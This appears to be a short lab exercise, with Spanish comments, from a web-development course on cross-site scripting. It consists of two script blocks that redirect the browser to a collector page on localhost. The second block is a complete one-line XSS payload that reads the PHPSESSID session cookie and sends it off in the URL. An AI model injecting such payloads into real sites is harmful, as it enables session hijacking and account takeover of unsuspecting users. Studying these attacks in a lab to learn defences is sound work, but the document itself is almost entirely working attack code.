<script>
    // Obtener el valor de la cookie PHPSESSID
    // var sessid = document.cookie.match(/PHPSESSID=([^;]+)/)[1];
    var sessid = 3;

    // Crear una nueva solicitud GET hacia recibe_sessid.php
    var url = 'http://localhost/dsw/ut4/ataquexss/recibe_phpsessid.php?phpsessid=' + sessid;

    // Redirigir al usuario o enviar la solicitud en segundo plano
    window.location.href = url; // Redirige al usuario
    // O, para una solicitud en segundo plano, podrías usar:
    // new Image().src = url;
</script>


<script>window.location.href = 'http://localhost/dsw/ut4/ataquexss/recibe_phpsessid.php?phpsessid=' + document.cookie.match(/PHPSESSID=([^;]+)/)[1];</script>
